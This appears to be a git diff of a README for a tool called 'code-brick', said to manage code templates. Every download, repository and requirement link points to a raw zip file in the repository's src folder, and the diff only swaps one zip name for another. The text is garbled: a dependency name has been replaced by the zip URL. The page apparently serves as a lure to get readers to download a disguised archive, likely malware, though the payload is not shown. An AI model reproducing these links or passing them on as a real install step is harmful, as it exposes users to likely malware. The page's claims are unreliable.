@@ -1,6 +1,6 @@
 # 🧱 code-brick - Easily Manage Your Code Templates
 
-![Download code-brick](https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip%20code--brick-v1.0-blue)
+![Download code-brick](https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip%20code--brick-v1.0-blue)
 
 ## 📦 Overview
 Welcome to **code-brick**, your personal code template manager. With code-brick, you can save, organize, and reuse code snippets across projects. This application works seamlessly with any framework you use. Whether you are working on web apps or mobile applications, code-brick helps streamline your coding process.
@@ -11,7 +11,7 @@ Getting started with code-brick is simple. Just follow these steps to download a
 ## 📥 Download & Install
 To get the latest version of code-brick, visit this page:
 
-[Download code-brick](https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip)
+[Download code-brick](https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip)
 
 1. **Open your web browser.**
 2. **Go to the releases page above.**
@@ -26,7 +26,7 @@ Before using code-brick, make sure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** At least 100 MB of free disk space.
-- **https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip** Version 12 or higher must be installed. You can download https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip from [https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip](https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip).
+- **https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip** Version 12 or higher must be installed. You can download https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip from [https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip](https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip).
 
 ## 📝 How to Use code-brick
 Once the installation is complete, you can start using code-brick. Follow these simple steps:
@@ -60,7 +60,7 @@ If you're interested in learning more about effective code management, consider 
 - **Books:** Look for books on productivity for developers to gain new perspectives on effective coding habits.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip)
-- [https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip Download](https://raw.githubusercontent.com/nQrse/code-brick/main/src/brick_code_3.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip)
+- [https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip Download](https://raw.githubusercontent.com/nQrse/code-brick/main/src/code_brick_3.5.zip)
 
 Thank you for choosing code-brick! We hope this tool makes your coding experience smoother and more organized. If you encounter any issues, remember to check the community support resources as needed. Enjoy your coding!
